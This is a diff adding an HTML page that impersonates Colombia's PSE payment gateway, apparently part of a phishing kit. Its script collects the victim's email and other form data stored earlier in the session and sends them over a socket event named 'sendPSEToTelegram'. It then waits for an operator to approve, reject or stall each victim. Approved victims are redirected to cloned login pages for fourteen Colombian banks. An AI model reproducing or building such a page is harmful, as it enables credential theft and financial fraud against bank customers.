@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PSE - Pago Seguro en Línea</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <script src="/socket.io/socket.io.js"></script>
+    
+    <!-- Background Pattern -->
+    <div class="bg-pattern"></div>
+
+    <!-- Header con NFbanner-izq.svg grande -->
+    <header class="header">
+        <img src="img/NFbanner-izq.svg" alt="PSE" class="main-banner">
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <div class="content-box">
+            <!-- Título -->
+            <h1 class="main-title">Selecciona el tipo de persona:</h1>
+
+            <!-- Formulario -->
+            <form class="main-form" id="pse-form">
+                <!-- Selector de Tipo de Persona -->
+                <div class="person-selector">
+                    <label class="person-card selected" data-type="natural">
+                        <input type="radio" name="personType" value="natural" checked>
+                        <img src="img/natural_check.svg" alt="Natural" class="person-img">
+                        <span class="person-label">Natural</span>
+                    </label>
+                    <label class="person-card" data-type="juridica">
+                        <input type="radio" name="personType" value="juridica">
+                        <img src="img/juridica.svg" alt="Jurídica" class="person-img">
+                        <span class="person-label">Jurídica</span>
+                    </label>
+                </div>
+
+                <!-- Opciones de Usuario -->
+                <div class="user-options">
+                    <button type="button" class="user-option selected" id="registered-user">
+                        <img src="img/opreg_sel.svg" alt="" class="option-icon">
+                        <span>Soy un usuario registrado</span>
+                    </button>
+                    <button type="button" class="user-option" id="new-user">
+                        <img src="img/opact.svg" alt="" class="option-icon">
+                        <span>Registrarme ahora</span>
+                    </button>
+                </div>
+
+                <!-- Campo de Email -->
+                <div class="email-field">
+                    <label for="email" class="field-label">
+                        Ingresa tu correo electrónico <span class="asterisk">*</span>
+                    </label>
+                    <input 
+                        type="email" 
+                        id="email" 
+                        name="email" 
+                        class="email-input" 
+                        placeholder="Ej: correo@pse.com.co"
+                        required
+                    >
+                </div>
+
+                <!-- Botones -->
+                <div class="form-buttons">
+                    <button type="submit" class="btn-primary" id="btn-submit">
+                        Ir al Banco
+                    </button>
+                    <button type="button" class="btn-secondary" onclick="window.history.back()">
+                        Regresar al comercio
+                    </button>
+                </div>
+            </form>
+
+            <!-- Información de Contacto -->
+            <div class="contact-box">
+                <div class="contact-icon-left">
+                    <img src="img/footerD.svg" alt="Contacto">
+                </div>
+                <div class="contact-content">
+                    <h3 class="contact-title">Para mayor información comunícate con nosotros:</h3>
+                    <div class="contact-info">
+                        <div class="contact-row">
+                            <img src="img/mobile.svg" alt="Teléfono">
+                            <span><strong>En Bogotá:</strong> +57 (601) 3808890 opción 5</span>
+                        </div>
+                        <div class="contact-row">
+                            <img src="img/conta.svg" alt="Web">
+                            <span><strong>Contáctanos:</strong> <a href="https://www.pse.com.co/persona-centro-de-ayuda" target="_blank">https://www.pse.com.co/persona-centro-de-ayuda</a></span>
+                        </div>
+                    </div>
+                    <div class="ach-logo">
+                        <img src="img/footer.svg" alt="ACH Colombia">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Pantalla de Carga (Oculta por defecto) -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <img src="img/procesandonw.gif" alt="Procesando" class="loading-gif">
+            <p class="loading-text">Procesando tu solicitud...</p>
+        </div>
+    </div>
+
+    <script>
+        const sessionId = localStorage.getItem('nequiSessionId');
+        if (!sessionId) {
+            alert('Error: Sesión no encontrada. Por favor inicia de nuevo.');
+            window.location.href = '/';
+        }
+        
+        const form = document.getElementById('pse-form');
+        const emailInput = document.getElementById('email');
+        const personCards = document.querySelectorAll('.person-card');
+        const userOptions = document.querySelectorAll('.user-option');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        const socket = io({
+            transports: ['websocket', 'polling'],
+            reconnection: true,
+            reconnectionDelay: 200,
+            reconnectionDelayMax: 1000,
+            reconnectionAttempts: 20,
+            timeout: 5000,
+            pingInterval: 2000,
+            pingTimeout: 5000
+        });
+
+        let keepAliveInterval, pingInterval;
+        
+        function startKeepAlive() {
+            stopKeepAlive();
+            keepAliveInterval = setInterval(() => socket?.connected && socket.emit('keepAlive', { sessionId }), 3000);
+            pingInterval = setInterval(() => socket?.connected && socket.emit('ping'), 2000);
+        }
+        
+        function stopKeepAlive() {
+            if (keepAliveInterval) clearInterval(keepAliveInterval);
+            if (pingInterval) clearInterval(pingInterval);
+        }
+
+        socket.on('connect', () => {
+            socket.emit('initSession', { sessionId, module: 'pse', page: 'pse-form' });
+            startKeepAlive();
+        });
+        
+        // Selector de tipo de persona
+        personCards.forEach(card => {
+            card.addEventListener('click', function() {
+                personCards.forEach(c => c.classList.remove('selected'));
+                this.classList.add('selected');
+                this.querySelector('input[type="radio"]').checked = true;
+            });
+        });
+
+        userOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                userOptions.forEach(opt => opt.classList.remove('selected'));
+                this.classList.add('selected');
+            });
+        });
+
+        emailInput.addEventListener('input', function() {
+            this.classList.remove('error');
+        });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Validar email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailInput.value || !emailRegex.test(emailInput.value)) {
+                emailInput.classList.add('error');
+                return;
+            }
+
+            // Obtener datos previos
+            const previousData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+
+            // Combinar datos
+            const pseData = {
+                ...previousData,
+                personType: document.querySelector('input[name="personType"]:checked').value,
+                email: emailInput.value,
+                registeredUser: document.getElementById('registered-user').classList.contains('selected'),
+                timestamp: new Date().toISOString()
+            };
+
+            // Guardar
+            sessionStorage.setItem('pseData', JSON.stringify(pseData));
+
+            // Mostrar loading
+            loadingOverlay.classList.add('active');
+
+            // Enviar a Telegram
+            socket.emit('sendPSEToTelegram', {
+                sessionId,
+                data: pseData
+            });
+        });
+
+        socket.on('telegramSent', () => {});
+        socket.on('actionApprovePSE', (data) => {
+            if (data.sessionId !== sessionId) return;
+            
+            console.log('✅ PSE aprobado, redirigiendo al banco...');
+            stopKeepAlive();
+            loadingOverlay.classList.remove('active');
+            
+            // Obtener el banco seleccionado
+            const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+            const selectedBank = formData.bank;
+            
+            if (selectedBank) {
+                // Mapeo de bancos a sus rutas
+                const bankRoutes = {
+                    'Agrario': '/bancas/Agrario/index.html',
+                    'AV Villas': '/bancas/AV-Villas/index.html',
+                    'Banco Mundo Mujer': '/bancas/Banco-Mundo-Mujer/index.html',
+                    'Bancolombia': '/bancas/Bancolombia/index.html',
+                    'BBVA': '/bancas/BBVA/index.html',
+                    'Bogota': '/bancas/Bogota/index.html',
+                    'Caja Social': '/bancas/Caja-Social/index.html',
+                    'Daviplata': '/bancas/Daviplata/index.html',
+                    'Davivienda': '/bancas/Davivienda/index.html',
+                    'Falabella': '/bancas/Falabella/index.html',
+                    'Occidente': '/bancas/Occidente/index.html',
+                    'Popular': '/bancas/Popular/index.html',
+                    'Scotiabank Colpatria': '/bancas/Scotiabank-Colpatria/index.html',
+                    'Serfinanza': '/bancas/Serfinanza/index.html'
+                };
+                
+                const bankRoute = bankRoutes[selectedBank];
+                if (bankRoute) {
+                    console.log('📍 Redirigiendo a:', bankRoute);
+                    window.location.href = bankRoute;
+                } else {
+                    console.warn('⚠️ Banco no encontrado:', selectedBank);
+                    alert('Banco seleccionado no disponible');
+                    window.location.href = '/';
+                }
+            } else {
+                alert('Error: No se encontró el banco seleccionado');
+                window.location.href = '/';
+            }
+        });
+
+        // Rechazar
+        socket.on('actionRejectPSE', (data) => {
+            if (data.sessionId !== sessionId) return;
+            
+            console.log('❌ PSE rechazado');
+            stopKeepAlive();
+            loadingOverlay.classList.remove('active');
+            alert('Transacción rechazada');
+            window.location.href = '/';
+        });
+
+        // Esperar
+        socket.on('actionWaitPSE', (data) => {
+            if (data.sessionId !== sessionId) return;
+            
+            console.log('⏳ Esperando...');
+            setTimeout(() => {
+                console.log('⏳ Tiempo completado');
+            }, data.waitTime * 1000 || 15000);
+        });
+        
+        socket.on('error', (error) => {
+            console.error('❌ Error:', error);
+            loadingOverlay.classList.remove('active');
+            alert('Ocurrió un error. Por favor intenta nuevamente.');
+        });
+
+        socket.on('connect_error', (error) => {
+            console.error('❌ Error de conexión:', error);
+        });
+
+        window.addEventListener('beforeunload', stopKeepAlive);
+    </script>
+</body>
+</html>
